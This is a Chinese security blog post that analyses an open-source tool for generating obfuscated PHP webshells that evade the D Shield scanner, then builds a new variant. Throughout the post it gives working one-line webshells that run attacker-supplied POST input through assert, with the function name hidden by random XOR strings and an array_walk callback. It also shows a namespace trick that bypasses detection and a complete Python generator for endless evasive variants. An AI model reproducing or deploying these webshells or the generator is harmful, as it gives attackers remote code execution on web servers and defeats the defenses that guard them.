> 原文链接: https://www.anquanke.com//post/id/193042 


# 随机异或无限免杀D盾之再免杀


                                阅读量   
                                **1196188**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0143b3bda41a7582fc.jpg)](https://p2.ssl.qhimg.com/t0143b3bda41a7582fc.jpg)



## 项目分析

> 随机异或无限免杀D盾项目分析

首先分析随机异或无限免杀D盾的github项目：[https://github.com/yzddmr6/webshell-venom](https://github.com/yzddmr6/webshell-venom)

1，首先分析其生成的木马样例：（当前已经不免杀）

```
&lt;?php
class PXGF`{`
    function __destruct()`{`
        $RAFH='slvf*o'^"x12x1fx5x3x58x1b";
        return @$RAFH("$this-&gt;WSXP");
    `}`
`}`
$pxgf=new PXGF();
@$pxgf-&gt;WSXP=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?&gt;
```

此木马中$RAFH的值是由两串`'slvf*o'^"x12x1fx5x3x58x1b";`字符异或得到的，此异或结果为assert。即$RAFH=assert，其中`return @$RAFH("$this-&gt;WSXP");`即为:`$pxgf-&gt;WSXP`是等于`$this-&gt;WSXP`，给`$pxgf-&gt;WSXP`如下赋值时，也就是给`$this-&gt;WSXP`如下赋值。即结果为：

```
return $RAFH("isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6']");
```

而RAFH又等于assert，即最后结果为：即一句话木马

```
return assert("isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6']");
```

这个利用随机异或无限免杀D盾的核心其实就是这个点了，至于异或个人认为也是很巧妙的，下面分析其利用随机异或生成payload的代码：

其生成的shellcode的模型如下：(当前免杀失效的主要原因个人认为还是此模型被杀了)

```
shell_form ='''&lt;?php
class `{`class_name`}``{``{`
    function __destruct()`{``{`
        $`{`var_name1`}`=`{`func1`}`;
        return @$`{`var_name1`}`("$this-&gt;`{`var_name2`}`");
    `}``}`
`}``}`
$`{`objname`}`=new `{`class_name`}`();
@$`{`objname`}`-&gt;`{`var_name2`}`=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?&gt;'''
```

其实参考我对上述对木马样例分析，就很容易理解这个木马模型了，`{`class_name`}`、`{`var_name1`}`、`{`var_name2`}`、`{`objname`}`都是利用python代码随机生成的名称，随便写即可。下面需要说明的是`{`func1`}`值的生成。其实利用yzddmr6表哥的python生成的所有的不同点都在这`{`class_name`}`、`{`var_name1`}`、`{`var_name2`}`、`{`objname`}`、`{`func1`}`五个点，除了上述解释的模型是核心之外，就是这个`{`func1`}`了。

`{`func1`}`的生成过程如下：

首先查看gen_webshell()函数，即webshell生成函数：

```
def gen_webshell():
    class_name = random_name(4)
    objname = class_name.lower()
    webshell=shell_form.format(class_name=class_name,func_name=random_name(4),objname=objname,var_name1=random_name(4),var_name2=random_name(4),func1=gen_payload(func1))
    print(webshell)
```

我们可以很清楚的看到倒数第二行中有`func1=gen_payload(func1)`即func1是由gen_payload函数生成的，查看了整体代码得知其中gen_payload函数中的参数func1的值为assert,我继续查看gen_payload函数如下：

```
def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = ''`{`0`}`'^"`{`1`}`"'.format(func_line1,func_line2)
    return payload
```

这个函数中又包含了两个小函数random_keys()和xor()，那么我就先分析这两个小函数吧：

random_keys函数：

```
def random_keys(len):
    str = '`~-=!@#$%^&amp;*_/+?&lt;&gt;`{``}`|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))
```

random**key函数是生成一个长度为len的随机字符串，字符串中的字符都取自str变量中，即取自“~-=!@#$%^&amp;***/+?&lt;&gt;`{``}`|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`

xor函数：

```
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"x")
```

将字符c1和字符c2转换成ascii码后进行异或运算，再利用hex函数转换为十六进制，同时其中将0x转换成x

好了，下面继续分析gen_payload函数：func是传入gen_payload(func)函数的参数，此处应该是assert，即一个命令执行的函数。然后计算出assert的长度，然后利用random_keys函数从字符串str中随机取出5个字符：赋值给key

```
key = random_keys(len(func))
```

利用for循环分别将func和key字符串中的字符一一取出，分别进行异或运算后，然后连接成了func_line2字符串，而将key字符串赋值给了func_line1字符串。

```
for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
```

最后就得到了payload:即字符串func_line2和字符串func_line1异或。而func_line2和字符串func_line1异或的结果应该是等于func的。原因如下：假设a^b=c，那么a=c^b，即异或是可逆的。此循环将func和key异或的值存放到了func_line2中，将key赋值给了func_line，即此处key=func_line1。最终结果等价于func^func_line1=func_line2，而return的结果是func_line2^func_line1，即最后return的几个依旧是func，即一个命令执行函数assert。只是为了避开d盾的查杀换了一种方式。

```
payload = ''`{`0`}`'^"`{`1`}`"'.format(func_line1,func_line2)
```

到这里就分析完成了，即shellcode的模型中的`{`func1`}`的值是利用随机异或生成函数gen_payload生成的，例如：

```
'rG!q-X'^"x13x34x52x14x5fx2c"
```

上诉字符串看似凌乱，但是其异或的结果依旧是assert。

综上所述：随机异或无限免杀D盾项目的核心点有两个：

1，此木马生成模板本身具备免杀性

2，利用随机异或隐藏了assert，eval等D盾敏感的命令执行函数。



## 免杀马再免杀

> 根据上述特点我们也可以通过这两点思路来构造免杀马：
1，使得木马模板具备免杀性
2，隐藏assert，eval等D盾敏感的关键字

我就随便选择一种：利用回调函数构造的免杀马：

例如随便选择一个回调函数array_walk()即可构造如下木马：

```
&lt;?php
function v01cano($aaa, $bbb)`{`
    $ccc=$bbb;
    array_walk($aaa, $ccc);
`}`
$ddd = 'rG!q-X'^"x13x34x52x14x5fx2c";
v01cano(array($_POST['e']), $ddd);
?&gt;
```

D盾报出了可能是木马级别是二级，原因是识别了array_walk函数。

[![](https://img-blog.csdnimg.cn/20191117194826932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)](https://img-blog.csdnimg.cn/20191117194826932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)

接下来我们在array_walk前面加上命名空间即可轻松绕过D盾：

```
&lt;?php
function v01cano($aaa, $bbb)`{`
    $ccc=$bbb;
    array_walk($aaa, $ccc);
`}`
$ddd = 'rG!q-X'^"x13x34x52x14x5fx2c";
v01cano(array($_POST['e']), $ddd);
?&gt;
```

[![](https://img-blog.csdnimg.cn/20191117205233575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)](https://img-blog.csdnimg.cn/20191117205233575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)

那么接下来就可以参考yzddmr6表哥的方法使用我们新的免杀马模板来随机异或无限免杀D盾，只需修改yzddmr6表哥的免杀马模板部分即可。

即参考如上免杀马，修改模板为如下：

```
&lt;?php
function `{`func_name`}`($`{`var_name1`}`, $`{`var_name2`}`)`{``{`
    $`{`var_name3`}`=$`{`var_name2`}`;
    \array_walk($`{`var_name1`}`, $`{`var_name3`}`);
`}``}`
$`{`var_name4`}` = `{`func1`}`;
`{`func_name`}`(array($_POST['e']), $`{`var_name4`}`);
?&gt;
```

最终代码如下：

```
import random

# 命令执行函数
func1 = 'assert'

# 每次生成一个不同的变量（函数）名，长度为len
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

# 每次返回一个len长度的字符串（里面包含特殊字符，用于异或免杀）
def random_keys(len):
    str = '`~-=!@#$%^&amp;*_/+?&lt;&gt;`{``}`|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    a = random.sample(str, len)
    return ''.join(a)

# 将字符c1和字符c2进行异或运算，同时将0x转换成x
def xor(c1,c2):
    c = hex(ord(c1)^ord(c2))
    return c.replace('0x',r"x")


# payload生成函数
def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = ''`{`0`}`'^"`{`1`}`"'.format(func_line1,func_line2)
    return payload


shell_form='''
&lt;?php
function `{`func_name`}`($`{`var_name1`}`, $`{`var_name2`}`)`{``{`
    $`{`var_name3`}`=$`{`var_name2`}`;
    \array_walk($`{`var_name1`}`, $`{`var_name3`}`);
`}``}`
$`{`var_name4`}` = `{`func1`}`;
`{`func_name`}`(array($_POST['e']), $`{`var_name4`}`);
?&gt;
'''

def gen_webshell():
    webshell=shell_form.format(func_name=random_name(4), var_name1=random_name(4), var_name2=random_name(4), var_name3=random_name(4), var_name4=random_name(4), func1=gen_payload(func1))
    print(webshell)


gen_webshell()
```

于是我们也就可以再次实现随机异或无限免杀D盾。

最后运行上诉python代码即可随机生成免杀马：

[![](https://img-blog.csdnimg.cn/20191117210117766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)](https://img-blog.csdnimg.cn/20191117210117766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3YwMWNhbm8=,size_16,color_FFFFFF,t_70)

这样就又达到了免杀的效果。

其实个人认为此项目的核心就是我上诉所说的两点：

> 1，此木马生成模板本身具备免杀性
2，利用随机异或隐藏了assert，eval等D盾敏感的命令执行函数。

模板免杀应该是重中之重，各位表哥们也可以根据自己的需要简单修改即可。

关于免杀马的构造方法太多了，我就直接附上404表哥文章给大家参考：

[https://xz.aliyun.com/t/5152](https://xz.aliyun.com/t/5152)

然后就是yzddmr6表哥的项目地址：思路很骚。

[https://github.com/yzddmr6/webshell-venom](https://github.com/yzddmr6/webshell-venom)
